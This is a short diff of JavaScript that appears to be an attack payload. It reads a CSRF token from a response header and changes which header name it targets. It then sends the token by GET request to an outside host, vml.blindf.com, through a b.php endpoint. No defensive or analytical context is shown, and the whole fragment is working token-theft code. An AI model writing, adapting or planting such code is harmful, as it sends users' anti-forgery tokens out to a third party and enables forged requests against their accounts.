@@ -4,7 +4,7 @@ xhr.onreadystatechange = function()
 {
 if (xhr.readyState == 4 && xhr.status == 200)
 {
-var yourtoken = xhr.getResponseHeader('Csrf-token')
+var yourtoken = xhr.getResponseHeader('X-CSRF-Signature')
 var xhr2 = new XMLHttpRequest();
 xhr2.open("GET", "https://vml.blindf.com/b.php?c="+ yourtoken );
 xhr2.send();
